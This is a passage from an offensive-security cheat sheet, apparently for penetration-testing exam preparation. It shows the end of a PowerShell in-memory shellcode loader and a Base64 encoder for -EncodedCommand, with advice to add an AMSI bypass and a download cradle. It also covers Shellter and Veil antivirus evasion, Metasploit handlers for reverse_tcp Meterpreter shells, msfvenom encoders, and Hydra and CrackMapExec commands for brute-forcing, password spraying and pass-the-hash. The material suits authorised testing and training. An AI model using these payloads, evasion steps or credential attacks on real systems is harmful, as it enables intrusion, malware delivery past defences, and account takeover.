$win32Functions::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [IntPtr]::Zero);
while ($true) { Start-Sleep 60; }

Alternative Base64 encoder script from darkoperator/ps_encoder.py — use to encode the above script for powershell.exe -EncodedCommand.

  • -EncodedCommand accepts UTF-16LE Base64, bypassing simple string-matching on command-line arguments; PowerShell 5+ script-block logging still decodes and logs plaintext before execution.
  • For best results, combine encoding with an AMSI bypass and deliver via a download cradle so the encoded payload never touches disk.
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import base64
import sys
import re
import os
import getopt

def powershell_encode(data):
    blank_command = ""
    powershell_command = ""
    n = re.compile(u'(\xef|\xbb|\xbf)')
    for char in (n.sub("", data)):
        blank_command += char + "\x00"
    powershell_command = blank_command
    powershell_command = base64.b64encode(powershell_command.encode())
    return powershell_command.decode("utf-8")

def usage():
    print("Usage: {0} -s <script>".format(sys.argv[0]))
    sys.exit(0)

def main():
    try:
        options, args = getopt.getopt(sys.argv[1:], 'hs:', ['help', 'script='])
    except getopt.GetoptError:
        usage()
    if len(sys.argv) == 1:
        usage()
    for opt, arg in options:
        if opt in ('-h', '--help'):
            usage()
        elif opt in ('-s', '--script'):
            script_file = arg
            if not os.path.isfile(script_file):
                print("Script not found")
                sys.exit(1)
            else:
                ps_script = open(script_file, 'r').read()
                print(powershell_encode(ps_script))

if __name__ == "__main__":
    main()

7.2 Shellter (Automatic Tool)

Shellter injects shellcode into legitimate Windows PE binaries to bypass AV detection; it requires Wine to run on Linux.

  • Shellter traces the PE's execution graph under Wine, picks a dynamic injection point inside a real code section, then patches in a trampoline and the shellcode, preserving the original application's behaviour.
  • Use a recent, uncommon legitimate PE as the host; commonly used hosts (e.g. PuTTY, WinSCP) may have their Shellter-injected variants already in AV databases.
  • Shellter only supports 32-bit PEs; ensure wine32 and a 32-bit source PE are used.
  • Auto mode works well in most cases; Manual mode lets you choose a specific injection point for a more unique pattern. Supply a raw custom shellcode file (C option) for non-Metasploit payloads.
Tool Approach Defeats Limitations / When to Prefer
Shellter Injects shellcode into existing 32-bit PE execution flow Signature scanning; static PE heuristics 32-bit only; Wine required on Linux; known-common host PEs may already be fingerprinted
Veil Generates a new EXE that wraps shellcode in Python/C/Go stubs Signature scanning; some heuristics Produces a standalone EXE; effective when a fresh PE structure evades; less evasive than injecting into a signed binary
Manual PS injection Loads shellcode entirely in memory via Win32 API calls from PowerShell On-disk signatures; static PE analysis Requires PowerShell execution path; AMSI/script-block logging must be bypassed; most flexible approach for custom payloads
Custom packer/crypter Encrypts payload; unique stub decrypts and executes at runtime Signature scanning; heuristic analysis Most evasive against signature/heuristic engines; behavioural EDR still fires on injection API calls; requires development effort 
apt-cache search shellter && sudo apt install shellter
sudo apt install wine
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST [ip];set LPORT [port];run;"

Troubleshooting Wine kernel32.dll errors: https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811. Similar tool: Veil (guide).

7.4 Msfvenom

Generate staged and stageless reverse/bind shells for common platforms; catch with Netcat (stageless) or exploit/multi/handler (staged).

  • Staged payloads (/ separator, e.g. windows/meterpreter/reverse_tcp) send a tiny stager first; stageless payloads (_ separator) embed everything in the generated file and can be caught with plain Netcat.
  • Match -f format to execution context: asp/aspx for IIS, war for Tomcat, elf for Linux, exe for Windows.
  • Always match payload architecture to the target process; use windows/x64/ payloads for 64-bit targets.
  • Use -f c for C-style arrays (buffer overflow exploit dev), -f python for Python scripts, -f raw when piping into another tool.
Encoder Flag Characteristic Use Case
shikata_ga_nai -e x86/shikata_ga_nai Polymorphic XOR additive feedback; different output each run General-purpose AV evasion; well-known but still useful with multiple iterations or chaining
fnstenv_mov -e x86/fnstenv_mov Uses FPU instructions to locate EIP; less common than shikata Bad-character avoidance in exploit development when shikata is flagged
countdown -e x86/countdown Simple sub-based decoder; small stub Tight buffer constraints; chain after shikata for a second layer
alpha_mixed -e x86/alpha_mixed Output is purely alphanumeric printable characters Exploits where only alphanumeric bytes pass through (e.g. certain input filters)
unicode_mixed -e x86/unicode_mixed Encodes to Unicode-safe byte sequence Targets where input is processed as Unicode (e.g. Windows wide-char buffers) 
nc -nvlp <LISTENING_PORT>                    # stageless payloads only
# Metasploit multi/handler — required for staged payloads (exam: one machine only)
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <IP>
set lport <PORT>
set ExitOnSession false
exploit -j

8. Password Attacks

Techniques for recovering credentials through brute-force, spraying, file hash cracking, and offline cracking with Hydra, John the Ripper, and Hashcat.

  • Always prefer offline cracking (no noise, no lockout) over online attacks when you have a captured hash or protected file.
  • Start with rockyou.txt, then targeted wordlists, then mutated variants via Hashcat rules before brute-force keyspace.
  • Online attacks (Hydra, CME spraying) can trigger account lockouts — check the lockout policy before launching and prefer spraying over per-account brute-force.
  • Cracked or dumped credentials should immediately be tested across all discovered services; password reuse across SSH, SMB, WinRM, RDP, and web is common in enterprise environments.
Attack Type Precondition Primary Tool(s) Noise / Lockout Risk When to Prefer
Online brute-force Valid username; live service reachable; no lockout policy hydra High — each attempt hits the server and may trigger lockout or IDS alert Service exposes auth, username confirmed, lockout verified absent
Online spraying User list; known or guessed common password; lockout window known hydra, crackmapexec Medium — stays under per-account threshold but still hits the wire AD environment; large user list; only one attempt per window
Offline wordlist Captured hash or password-protected file hashcat, john None — entirely local; no network traffic Always prefer when hash/file is in hand; fast for MD5/NTLM/SHA-1
Offline rule-based Captured hash; plain wordlist already failed hashcat -r None Common words with predictable mutations (e.g. Password1!); try before pure brute-force
Offline brute-force (mask) Captured hash; known password length or charset constraints hashcat -a 3 None — but GPU-hours can be expensive Short passwords (≤8 chars) with known charset; wordlist + rules already exhausted
File hash cracking Password-protected document, ZIP, PDF, or key file *2john + john / hashcat None File recovered from target share, backup, or filesystem
Pass-the-Hash / Pass-the-Ticket NTLM hash or Kerberos ticket in hand; no plaintext needed mimikatz, impacket, evil-winrm Low-medium — uses legitimate auth channels; still logged Hash uncrackable; target service accepts NTLM/Kerberos auth

8.1 Brute-Force

Use Hydra to brute-force authentication over common network protocols when you have a username and a wordlist.

hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>
hydra -l <username> -P <wordlist> ftp://<target_ip>
hydra -L <user_list> -P <password_list> smb://<target_ip>
hydra -l <username> -P <wordlist> telnet://<target_ip>
hydra -l <username> -P <wordlist> mysql://<target_ip>
hydra -l <username> -P <wordlist> postgres://<target_ip>
hydra -P <password_list> vnc://<target_ip>
hydra -l <username> -P <wordlist> <target_ip> http-get /
hydra -l <username> -P <wordlist> smtp://<target_ip>
hydra -P <wordlist> snmp://<target_ip>
hydra -P <password_list> redis://<target_ip>
Service / Protocol Hydra Module Default Port Username Required? Notes
SSH ssh:// 22 Yes Use -t 4; SSH may rate-limit aggressively
FTP ftp:// 21 Yes Anonymous login may already be allowed — check first
SMB smb:// 445 Yes Prefer CrackMapExec for AD environments; Hydra for standalone hosts
RDP rdp:// 3389 Yes Network Level Auth (NLA) may require valid creds before the full handshake
HTTP Basic Auth http-get 80/443 Yes Use https-get for TLS; check for 403 vs 401 confusion
HTTP POST Form http-post-form 80/443 Yes Needs URI, POST body template, and failure string — see §6.4
SMTP smtp:// 25/587/465 Yes Use -s <port> for non-standard ports
MySQL mysql:// 3306 Yes Root user brute-force if DB exposed to network
PostgreSQL postgres:// 5432 Yes Try postgres as username; often default creds
Telnet telnet:// 23 Yes Legacy service; still found on embedded/IoT targets
VNC vnc:// 5900 No Password only; no username field; -P only
SNMP snmp:// 161 UDP No Community strings only; -P with community string wordlist
Redis redis:// 6379 No Auth password only; often left unauthenticated — check first

8.2 Spraying Credentials

Password spraying tests one password against many accounts to avoid lockouts; use Hydra for RDP and CrackMapExec for Windows/AD services.

# RDP password spray - one password across many users
hydra -L <user_list> -p "<password>" rdp://<target_ip>
crackmapexec smb <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success
crackmapexec winrm <target_ip> -u <user_list> -H <hash_list>
crackmapexec winrm <target_ip_list> -u <user_list> -H <hash_list> -d <domain> --continue-on-success
crackmapexec rdp <target_ip> -u <user_list> -p "<password>" --continue-on-success
crackmapexec ssh <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success
crackmapexec ftp <target_ip> -u <user_list> -p <password_list> -d <domain> --continue-on-success
crackmapexec smtp <target_ip> -u <user_list> -p <password_list> --continue-on-success
crackmapexec pop3 <target_ip> -u <user_list> -p <password_list> --continue-on-success
Service / Protocol CME Module Hydra Module Default Port Hash Spray (-H)? Exam / Practical Notes
SMB smb smb:// 445 Yes Most common AD lateral movement vector; Pwn3d! = local admin
WinRM winrm — 5985 / 5986 Yes Valid creds with WinRM access → evil-winrm shell
RDP rdp rdp:// 3389 No (plaintext only) NLA may block Hydra; use CME for credential validation first
SSH ssh ssh:// 22 No Useful on Linux hosts in AD or mixed environments
FTP ftp ftp:// 21 No Check for anonymous access before spraying
SMTP smtp smtp:// 25 / 587 No Mail relaying or internal mailbox access post-compromise
POP3 pop3 — 110 / 995 No Read mail for further cred/intel gathering
MSSQL mssql — 1433 Yes xp_cmdshell possible if sa cracked or sprayed successfully
